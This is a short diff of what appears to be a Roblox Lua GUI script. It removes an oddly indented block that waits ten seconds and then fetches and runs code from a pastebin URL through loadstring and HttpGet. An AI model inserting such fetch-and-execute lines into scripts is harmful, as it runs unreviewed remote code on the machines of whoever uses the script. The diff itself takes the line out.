@@ -180,11 +180,6 @@ spawn(function()
         end
     end
 end)      
-              wait(10)
-              
-              loadstring(game:HttpGet('https://pastebin.com/raw/7DEAz1i7'))()
-
-
 local MainS = win:Server("Main","")
 local Main = MainS:Channel("Main")
 
